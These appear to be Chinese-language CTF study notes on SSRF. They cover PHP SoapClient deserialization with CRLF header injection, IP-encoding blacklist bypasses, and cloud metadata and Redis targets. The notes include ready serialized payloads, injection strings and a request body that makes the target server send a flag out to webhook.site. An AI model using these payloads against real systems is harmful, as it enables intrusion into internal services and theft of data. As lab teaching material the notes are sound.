# 08 · SSRF（服务端请求伪造）

> 见`writeups/靶场/unserialize-lab-un9.md`

# 一、是什么

**SSRF = Server-Side Request Forgery**

> **让"服务器"代替"你"去发请求。**

# 二、为什么危险

**因为"服务器"在网络里的位置和你不同**：

```
你（外网）
  ├─→ 能访问：公网页面
  └─→ 不能访问：127.0.0.1 / 内网

服务器自己
  ├─→ 能访问：公网
  └─→ 能访问：127.0.0.1 / 内网   ← 你借它的手
```

# 三、`REMOTE_ADDR` 为什么不能伪造

**代码**：
```php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("必须本地访问");
```

**试过的头部（全部无效）**：
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

**`REMOTE_ADDR` 是 TCP 连接的源地址** —— **由内核填充，HTTP 层改不了。**

**→ 唯一办法：SSRF。**

> **但别把这条记成「IP 头全没用」** —— 关键看代码读的是哪一个：

| 代码里写的是 | 改 HTTP 头有用吗 | 例子 |
|---|---|---|
| `$_SERVER['REMOTE_ADDR']` | **全无效** → 只能靠 SSRF | **un9（本题）** |
| `$_SERVER['HTTP_X_FORWARDED_FOR']` | 有用（发 `X-Forwarded-For: 127.0.0.1`） | — |
| `$_SERVER['HTTP_X_REAL_IP']` | 有用（**且可能只认这一个**） | geekchallenge2024 第四关 |

**判据**：源码里是 `REMOTE_ADDR` 还是 `HTTP_xxx`。前者改头没用；后者**要把 IP 头全枚举一遍**。
完整枚举清单 + 两者区别 → [13-代理IP头XFF与X-Real-IP.md](./13-代理IP头XFF与X-Real-IP.md)

# 四、常见 SSRF 触发点

```php
file_get_contents($url);
curl_exec($ch);
fsockopen($host, $port);
fopen($url, 'r');
getimagesize($url);
md5_file($url);

// SoapClient（反序列化场景）
new SoapClient(null, ['location' => $url]);
// 调用任意不存在的方法 → __call → 发请求
```

# 五、SSRF 能干什么

| 用途 | 例子 |
|---|---|
| **访问内网/本地服务** | `http://127.0.0.1/admin.php` |
| **绕过 IP 白名单** | 让服务器以"自己"的身份访问 |
| **端口扫描** | `http://127.0.0.1:22`、`:3306`、`:6379` |
| **读云元数据** | `http://169.254.169.254/`（AWS） |
| **打内网其他系统** | `http://192.168.1.x/` |
| **Gopher 打 Redis/MySQL** | `gopher://127.0.0.1:6379/_...` |

# 六、绕过 IP 黑名单（IP 变形）

```
127.0.0.1        原形
2130706433       十进制
0177.0.0.1       八进制
0x7f.0.0.1       十六进制
127.1            简写
[::1]            IPv6
http://0.0.0.0/  也常指向本机
```

# 七、SoapClient + CRLF 注入（**实战重点**）

## 7.1 SoapClient 的 SSRF

```php
class SoapClient {
    // 调用不存在的方法 → 触发 __call → 向 $location 发 HTTP POST
}
```

**反序列化 payload**：
```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
```

**非 WSDL 模式**：第一个参数传 `null` → **任何方法都能调** → 全走 `__call`。

**报错解读（用来探测）**：
| 报错 | 含义 |
|---|---|
| `Error could not find "location" property` | 缺 `location` 属性 |
| `Error finding "uri" property` | 缺 `uri` 属性 |
| `looks like we got no XML document` | **请求成功了**（有服务、有响应，但非 XML） |
| `[HTTP] Not Found` | 有服务，路径 404 |
| `[HTTP] Could not connect to host` | 端口不通 |
| `[HTTP] Bad request` | 400（通常是把 CRLF 塞进了 `location`） |
| `Unknown protocol. Only http and https are allowed` | 协议被禁 |

## 7.2 注入点决定能覆盖什么（**本题核心**）

**HTTP 头"首值优先"**：同名头出现两次时，**排在前面的赢**。

→ **能不能覆盖一个头，不取决于你注入了什么，而取决于你的注入点排在第几。**

**SoapClient 的属性 → 请求头的位置关系**：

| 属性 | 变成什么头 | 相对 `Content-Type` 的位置 |
|---|---|---|
| **`_user_agent`** | **`User-Agent`** | **之前**（能抢到 Content-Type） |
| `uri` | `SOAPAction` | **之后**（抢不到） |
| `location` | 请求行（URL） | —（塞 CRLF 会 400） |

**实际请求头顺序**：
```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
User-Agent: ...                    ← _user_agent 注入点
Content-Type: text/xml; charset=utf-8   ← 目标头
SOAPAction: "..."                  ← uri 注入点（晚了）
```

**结论**：
- 想注入 **header**（如 `Cookie`）→ `uri` 就行
- 想覆盖 **`Content-Type`** 并控制 **POST body**（表单场景）→ **必须用 `_user_agent`**

## 7.3 属性名有 PHP 版本差异（**大坑**）

| PHP 版本 | UA 属性名 |
|---|---|
| **PHP 5.x** | **`_user_agent`**（带下划线） |
| PHP 7.x | `user_agent` |

- 网上文章基本都是 **PHP 7 写法** → 在 **PHP 5.5** 靶机上照抄 **完全无效**
- **本地确认属性名的方法**：
 ```php
  <?php
  $c = new SoapClient(null, array('location'=>'http://x/','uri'=>'y','user_agent'=>'UA'));
  echo serialize($c);
  // 输出里会出现： s:11:"_user_agent";s:2:"UA";   ← 按实际输出为准
 ```
- **构造函数里写 `user_agent`**（对外 API 不变），**序列化后自动变成 `_user_agent`**

## 7.4 CRLF 注入（完整打法）

**原理**：`\r\n` 能**提前结束当前头** → **插入新头** → **空行结束头部** → **塞 body**。

**注入内容**：
```php
$ua = "a\r\n"
    . "Content-Type: application/x-www-form-urlencoded\r\n"
    . "Content-Length: " . strlen($body) . "\r\n"
    . "\r\n"
    . $body;
```

**发出的请求**：
```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
User-Agent: a                                       ← 注入开始
Content-Type: application/x-www-form-urlencoded     ← 我们的，排第一，赢
Content-Length: 75
                                                    ← 空行，头结束
py=flag&url=http://webhook.site/xxxx                ← body 可控
Content-Type: text/xml; charset=utf-8               ← SoapClient 原本的，掉进 body 区被忽略
SOAPAction: "x#pyflag"
Content-Length: 370
```
**→ PHP 按表单解析 → `$_POST` 有值。**

**注入 Cookie（用 `uri`）**：
```php
$uri = "aaab\r\nCookie: py=flag; url=xxx\r\nX: ";
// 末尾的 \r\nX: 用来把 "uri#方法名" 的垃圾挡进下一个头（HTTP 头续行/无效头）
```

## 7.5 序列化格式差异

| PHP 版本 | 属性可见性 | 序列化样子 |
|---|---|---|
| PHP 5.x | public | `s:11:"_user_agent";` 简洁 |
| PHP 8.x | private | `s:15:"\0SoapClient\0uri";`（36 个属性，不兼容） |

**→ 必须用 PHP 5.4 生成，或手写。**

**协议限制**：只允许 `http` / `https`（`gopher://`、`dict://`、`php://` 全被禁）。

# 八、用 Webhook 验证盲 SSRF

**问题**：SSRF 是"盲"的，你看不到服务器发了什么。

**解决**：让服务器请求**你能看的地方**。

| 服务 | 说明 |
|---|---|
| **webhook.site** | 打开就用，实时显示请求 |
| requestcatcher.com | 同上 |
| 自己的 VPS | `python3 -m http.server 80` |

**webhook.site 的 JSON API**（程序化读取）：
```
https://webhook.site/token/<uuid>/requests?sorting=newest&per_page=5
```

## 4 级验证阶梯（每步都必须现象对了再往下）

| 级别 | 做什么 | 验证点 |
|---|---|---|
| **1** | `location=http://127.0.0.1/un92.php`，不注入 | `no XML document` = **SSRF 通了** |
| **2** | 注入 `_user_agent = "MYUA\r\nX-Test: HELLO"`，`location=webhook` | webhook 里 `user-agent: MYUA` + 多出 `x-test` = **注入生效** |
| **3** | 注入完整 Content-Type + Length + body，`location=webhook` | webhook 里 `content=py=flag&url=...`、`content-type` 是表单 = **body 可控** |
| **4** | 同上，但 `location=http://127.0.0.1/un92.php` | webhook 里出现 `?flag=...` = **完成** |

# 九、踩坑速查

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 属性名写成 `user_agent` | UA 不变，注入无效 | PHP 5.x 是 `_user_agent` | 用 `_user_agent` |
| 只用 `uri` 注入 | body 塞进去了，但对方收不到参数 | `SOAPAction` 排在 `Content-Type` 后，首值优先覆盖不了 | 改用 `_user_agent` |
| 用 PHP 8 生成 payload | 36 个 private 属性 | 格式不兼容 | 用 PHP 5.4 或手写 |
| curl 直接发 URL | 响应里 `"` `{}` 消失 | curl 的 `{}` URL globbing | URL 编码 / `curl -g` |
| 参数写在 query | 目标不响应 | 目标只认 `$_POST` | 必须注入 body |
| `location` 塞 CRLF | `400 Bad Request` | 破坏请求行 | 只能从 `_user_agent`/`uri` 注入 |

# 十、一句话

> **SSRF = 让服务器代替你发请求**。**`REMOTE_ADDR` 是 TCP 层，改不了 → 必须 SSRF**。**`SoapClient` 的 `__call` 是反序列化场景的 SSRF 入口**。**能不能覆盖 `Content-Type`，看注入点排第几：`_user_agent` 在前（赢），`uri` 在后（输）**。**属性名 PHP 5 是 `_user_agent`、PHP 7 是 `user_agent`**。**验证用 webhook.site，4 级阶梯逐步确认**。
